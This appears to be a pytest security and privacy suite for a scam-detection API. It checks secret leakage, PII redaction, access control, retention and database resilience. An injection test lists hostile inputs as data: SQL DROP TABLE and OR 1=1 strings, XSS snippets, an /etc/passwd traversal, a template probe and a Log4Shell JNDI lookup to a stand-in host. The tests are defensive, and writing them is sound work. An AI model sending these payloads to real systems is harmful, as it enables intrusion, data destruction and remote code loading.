"""
ScamShield AI - tests/test_phase7_security.py
=============================================
Security and privacy tests.

These assert the *claims* the documentation makes, so the docs cannot silently
become false. If someone weakens privacy handling or error hygiene, a test fails.
"""

from __future__ import annotations

import pytest


class TestSecretHygiene:
    """No secret may ever appear in an HTTP response."""

    SECRET_MARKERS = ("gemini_api_key", "privacy_salt", "api_key\"", "GEMINI_API_KEY=")

    @pytest.mark.parametrize(
        "path",
        ["/api/v1/health", "/", "/api/v1/samples", "/api/v1/scan/explain-scoring"],
    )
    def test_public_endpoints_do_not_leak_secrets(self, client, path):
        body = client.get(path).text
        for marker in self.SECRET_MARKERS:
            assert marker not in body, f"{path} leaked '{marker}'"

    def test_openapi_does_not_expose_secrets(self, client):
        schema = client.get("/openapi.json").text
        assert "privacy_salt" not in schema

    def test_health_redacts_configuration(self, client):
        body = client.get("/api/v1/health").json()
        assert "gemini_configured" in body
        assert "gemini_api_key" not in body


class TestPrivacyControls:
    def test_otp_not_stored_in_history(self, client, clean_history):
        client.post(
            "/api/v1/scan/message",
            json={"text": "Your OTP is 482913, share it to verify", "include_explanation": False},
        )
        detail = client.get("/api/v1/history").json()["items"][0]
        assert "482913" not in detail["message_preview"]

        scan_id = detail["scan_id"]
        stored = client.get(f"/api/v1/history/{scan_id}").json()
        assert "482913" not in stored["message_redacted"]

    def test_phone_number_not_stored(self, client, clean_history):
        client.post(
            "/api/v1/scan/message",
            json={"text": "Call me on 9876543210 about your account", "include_explanation": False},
        )
        scan_id = client.get("/api/v1/history").json()["items"][0]["scan_id"]
        stored = client.get(f"/api/v1/history/{scan_id}").json()
        assert "9876543210" not in stored["message_redacted"]
        # The detail endpoint must NOT return raw text unless explicitly asked.
        assert stored["raw_message"] is None

        # Opting in is possible when the deployment allows storing raw text.
        with_raw = client.get(f"/api/v1/history/{scan_id}?include_raw=true").json()
        assert "9876543210" in with_raw["raw_message"]

    def test_raw_message_not_serialised_to_history_list(self, client, clean_history):
        client.post(
            "/api/v1/scan/message",
            json={"text": "some private text about my account", "include_explanation": False},
        )
        items = client.get("/api/v1/history").json()["items"]
        assert all("raw_message" not in item for item in items)

    def test_content_hash_is_salted_sha256(self):
        from backend.services.privacy import content_hash

        digest = content_hash("same message")
        assert len(digest) == 64                      # SHA-256 hex
        assert digest != content_hash("different")    # changes with input
        assert content_hash("Same   Message") == content_hash("same message")

    def test_redaction_is_idempotent(self):
        from backend.services.privacy import redact

        once = redact("OTP is 482913, call 9876543210")
        assert redact(once) == once

    @pytest.mark.parametrize(
        "text, secret",
        [
            ("card 4111 1111 1111 1111 charged", "4111 1111 1111 1111"),
            ("mail me at victim@example.com", "victim@example.com"),
            ("pay to 9876543210@ybl", "9876543210"),
            ("IFSC SBIN0001234 for transfer", "SBIN0001234"),
        ],
    )
    def test_sensitive_values_are_redacted(self, text, secret):
        from backend.services.privacy import redact

        assert secret not in redact(text)


class TestInjectionAndAbuse:
    """Inputs must never be executed, evaluated or reflected unsafely."""

    @pytest.mark.parametrize(
        "payload",
        [
            '{"$ne": null}',
            "'; DROP TABLE scans; --",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil/a}",
            "\x00\x01\x02",
        ],
    )
    def test_malicious_payloads_are_handled_safely(self, client, clean_history, payload):
        response = client.post(
            "/api/v1/scan/message",
            json={"text": payload, "include_explanation": False},
        )
        # Either analysed safely (200) or rejected as invalid input (422) -
        # never a 500 and never a database error.
        assert response.status_code in {200, 422}
        # The table must still be usable afterwards (no SQL injection).
        assert client.get("/api/v1/history").status_code == 200

    def test_sql_injection_in_search_is_parameterised(self, client, clean_history):
        client.post("/api/v1/scan/message", json={"text": "hello there friend", "include_explanation": False})
        response = client.get("/api/v1/history?search=' OR 1=1 --")
        assert response.status_code == 200
        assert response.json()["total"] == 0

    def test_xss_payload_is_not_rendered_as_html_in_api(self, client, clean_history):
        payload = "<img src=x onerror=alert(1)>"
        client.post("/api/v1/scan/message", json={"text": payload, "include_explanation": False})
        body = client.get("/api/v1/history").text
        # The API returns JSON; the frontend escapes it with html.escape().
        assert "onerror" in body  # raw text preserved for search
        # But the preview field must be a plain string, not executable markup.
        items = client.get("/api/v1/history").json()["items"]
        assert isinstance(items[0]["message_preview"], str)

    def test_error_responses_do_not_leak_tracebacks(self, client):
        response = client.post("/api/v1/scan/message", json={"text": ""})
        assert response.status_code == 422
        body = response.text
        assert "Traceback" not in body
        assert "site-packages" not in body


class TestAPIAccessControl:
    def test_api_key_enforced_when_configured(self, client, monkeypatch):
        """With API_KEY set, scan endpoints must require the header."""
        from backend.config import get_settings

        settings = get_settings()
        monkeypatch.setattr(settings, "api_key", "test-secret-key")

        assert client.post("/api/v1/scan/message", json={"text": "hi"}).status_code == 401
        authorised = client.post(
            "/api/v1/scan/message",
            json={"text": "Hi, see you at 6 pm", "include_explanation": False},
            headers={"X-API-Key": "test-secret-key"},
        )
        assert authorised.status_code == 200

    def test_open_when_no_api_key_configured(self, client, clean_history):
        from backend.config import get_settings

        assert get_settings().api_key == ""
        assert client.post(
            "/api/v1/scan/message",
            json={"text": "Hello, meeting at 6", "include_explanation": False},
        ).status_code == 200


class TestRetention:
    def test_retention_limit_enforced(self, client, clean_history, monkeypatch):
        """Old rows must be trimmed once HISTORY_MAX_ROWS is exceeded."""
        from backend.config import get_settings
        from backend.database.repositories import scan_repository

        monkeypatch.setattr(get_settings(), "history_max_rows", 3)
        for index in range(5):
            client.post(
                "/api/v1/scan/message",
                json={"text": f"Meeting number {index} at the office", "include_explanation": False},
            )
        assert scan_repository.count_scans() <= 3


class TestConcurrency:
    def test_concurrent_scans_do_not_corrupt_the_database(self, client, clean_history):
        """SQLite + threads: the app must survive parallel writes."""
        from concurrent.futures import ThreadPoolExecutor

        def scan(index: int) -> int:
            response = client.post(
                "/api/v1/scan/message",
                json={
                    "text": f"Message {index}: please confirm the meeting at 6 pm",
                    "include_explanation": False,
                },
            )
            return response.status_code

        with ThreadPoolExecutor(max_workers=5) as pool:
            statuses = list(pool.map(scan, range(10)))

        assert all(status == 200 for status in statuses)
        # All ten rows are readable afterwards.
        assert client.get("/api/v1/history?page_size=50").json()["total"] == 10


class TestResilience:
    def test_api_recovers_when_the_database_file_is_deleted(self, client, clean_history, tmp_path):
        """
        Regression: deleting the .db file while the API runs used to make every
        stats/history call return HTTP 500. The connection layer now recreates
        the schema on demand.
        """
        import os

        from backend.config import get_settings
        from backend.database.repositories import scan_repository

        client.post(
            "/api/v1/scan/message",
            json={"text": "hello, see you at six", "include_explanation": False},
        )
        assert client.get("/api/v1/history/stats").json()["total_scans"] == 1

        db_path = get_settings().sqlite_path
        if os.path.exists(db_path):
            os.remove(db_path)

        # Must not raise, must return a clean (empty) result.
        assert client.get("/api/v1/history/stats").status_code == 200
        assert client.get("/api/v1/history").json()["total"] == 0
        assert scan_repository.count_scans() == 0
        # And the service must be usable again immediately.
        assert client.post(
            "/api/v1/scan/message",
            json={"text": "another normal message", "include_explanation": False},
        ).status_code == 200
